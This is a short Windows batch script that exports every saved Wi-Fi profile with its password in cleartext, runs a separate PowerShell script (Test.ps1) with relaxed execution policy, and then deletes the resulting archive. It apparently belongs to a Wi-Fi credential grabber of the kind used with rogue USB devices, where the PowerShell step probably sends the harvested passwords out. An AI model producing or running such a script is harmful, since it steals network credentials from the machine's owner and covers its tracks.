cd Desktop
mkdir A
cd A
netsh wlan export profile key=clear 
cd ..
Powershell.exe -executionpolicy remotesigned -File Test.ps1
del A.zip